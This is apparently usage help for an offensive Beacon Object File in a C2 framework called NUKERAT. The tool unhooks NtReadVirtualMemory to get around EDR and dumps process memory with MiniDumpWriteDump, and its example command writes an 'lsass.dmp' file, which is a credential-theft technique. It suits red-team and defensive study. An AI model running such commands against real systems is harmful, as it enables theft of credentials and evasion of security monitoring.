关于
    Unhooks NtReadVirtualMemory and creates a process memory dump using
    MiniDumpWriteDump. x64 only.
用法：
    bof-static-syscalls-dump --- <pid> [output_file]

参数：
    pid                 Target process ID to dump
    output_file         Optional output path (default: C:\Windows\Temp\PID-<pid>.dmp)

示例：
    bof-static-syscalls-dump --- 4337 C:\Users\user\Desktop\lsass.dmp
    bof-static-syscalls-dump --- 4337

NUKERAT 选项：
    -w <秒数>       等待超时的最大时间
    -bg             后台运行，不等待输出

    示例：
    bof-static-syscalls-dump -w 60 --- 4337 C:\Users\user\Desktop\lsass.dmp
